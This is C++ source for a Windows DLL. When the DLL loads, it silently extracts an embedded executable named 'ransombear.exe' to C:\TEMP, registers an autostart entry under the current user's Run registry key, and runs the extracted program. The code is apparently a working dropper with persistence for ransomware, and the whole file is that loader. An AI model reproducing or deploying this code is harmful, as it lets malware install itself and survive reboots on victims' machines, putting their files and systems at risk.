#include "pch.h"
#include <Windows.h>
#include <fstream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <cstdio>
#include "resource.h"
#include <filesystem>
#include <tlhelp32.h>
#include <comdef.h>
#include <iostream>
#define IDB_EMBEDEXE 52 


using namespace std;
class startup_management
{
private:
    HKEY m_handle_key = NULL;
    LONG m_result = 0;
    BOOL m_status = TRUE;
    DWORD m_registry_type = REG_SZ;
    wchar_t m_executable_path[MAX_PATH] = {};
    DWORD m_size = sizeof(m_executable_path);
    BOOL m_success = TRUE;

public:

    BOOL check(PCWSTR arg_application_name)
    {

        m_result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &m_handle_key);

        m_status = (m_result == 0);

        if (m_status)
        {
            m_result = RegGetValueW(m_handle_key, NULL, arg_application_name, RRF_RT_REG_SZ, &m_registry_type, m_executable_path, &m_size);
            m_status = (m_result == 0);
        }

        if (m_status)
        {
            m_status = (wcslen(m_executable_path) > 0) ? TRUE : FALSE;
        }

        if (m_handle_key != NULL)
        {
            RegCloseKey(m_handle_key);
            m_handle_key = NULL;
        }

        return m_status;
    }

    BOOL add(PCWSTR arg_application_name, PCWSTR arg_path_executable, PCWSTR arg_argument_to_exe)
    {
        const size_t count = MAX_PATH * 2;
        wchar_t registry_value[count] = {};


        wcscpy_s(registry_value, count, L"\"");
        wcscat_s(registry_value, count, arg_path_executable);
        wcscat_s(registry_value, count, L"\" ");

        if (arg_argument_to_exe != NULL)
        {
            wcscat_s(registry_value, count, arg_argument_to_exe);
        }

        m_result = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &m_handle_key, NULL);

        m_success = (m_result == 0);

        if (m_success)
        {
            m_size = (wcslen(registry_value) + 1) * 2;
            m_result = RegSetValueExW(m_handle_key, arg_application_name, 0, REG_SZ, (BYTE*)registry_value, m_size);
            m_success = (m_result == 0);
        }

        if (m_handle_key != NULL)
        {
            RegCloseKey(m_handle_key);
            m_handle_key = NULL;
        }

        return m_success;
    }
};

int ExtractResource(string fullPath) {
    char path[MAX_PATH] = "C:\\TEMP";

    HRSRC hrsrc = FindResource(NULL, MAKEINTRESOURCE(IDB_EMBEDEXE), RT_RCDATA);
    unsigned int myResourceSize = ::SizeofResource(NULL, hrsrc);
    cout << myResourceSize;
    HGLOBAL myResourceData = ::LoadResource(NULL, hrsrc);
    cout << myResourceData;
    void* pMyExecutable = ::LockResource(myResourceData);
    cout << pMyExecutable;

    //Write file to disk
    std::ofstream f(fullPath, std::ios::out | std::ios::binary);
    f.write((char*)pMyExecutable, myResourceSize);
    f.close();
    return 0;
};

//Create Directory Function
void CreateFolder(const char* path)
{
    if (!CreateDirectory(path, NULL))
    {
        return;
    }
}

extern __declspec(dllexport) int Go(void);
int Go(void) {


    startup_management o_startup;
    wchar_t executable_path[MAX_PATH];

    string fullPathEXE = "C:\\TEMP\\ransombear.exe";

    //Create Temp Directory
    CreateFolder("C:\\TEMP\\");

    //Extract Resource
    ExtractResource(fullPathEXE);

    //add persistence
    GetModuleFileNameW(NULL, executable_path, MAX_PATH);
    o_startup.add(L"C:\\TEMP\\ransombear.exe", executable_path, L"");

    //run program
    system("C:\\TEMP\\ransombear.exe");

    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Go();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

